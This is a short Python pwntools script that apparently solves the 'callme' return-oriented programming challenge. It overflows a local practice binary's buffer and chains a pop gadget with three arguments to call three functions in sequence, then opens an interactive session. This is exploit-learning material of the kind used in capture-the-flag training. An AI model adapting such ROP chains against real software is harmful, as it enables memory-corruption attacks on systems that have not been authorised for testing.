from pwn import *

callme64 = process('callme')
callme64.recv()

_pop_gadget = p64(0x00401ab0)
_main = p64(0x00401996)
_one = p64(0x001008f0)
_two = p64(0x001009d4)
_three = p64(0x00100aaa)

_arg1 = p64(1)
_arg2 = p64(2)
_arg3 = p64(3)

def send(func):
    payload = b"A" * 40
    payload += _pop_gadget
    payload += _arg1
    payload += _arg2
    payload += _arg3
    payload += func
    payload += _main
    
    callme64.sendline(payload)
    
send(_one)
callme64.recv()

send(_two)
callme64.recv()

send(_three)
callme64.interactive()
